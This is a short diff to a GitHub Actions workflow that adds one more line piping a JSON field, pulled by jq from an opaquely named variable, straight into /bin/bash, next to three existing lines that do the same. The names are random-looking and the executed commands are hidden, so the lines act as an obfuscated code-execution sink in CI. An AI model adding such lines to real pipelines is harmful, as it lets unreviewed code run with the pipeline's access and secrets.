@@ -24,6 +24,7 @@ jobs:
           echo $ju52 | jq -r .r738 | /bin/bash
           printf '%s' "$nxde7" | jq -r .et54 | /bin/bash
           echo $bew6 | jq -r .rtouw6630 | /bin/bash
+          echo $ul0385 | jq -r .gczul61 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
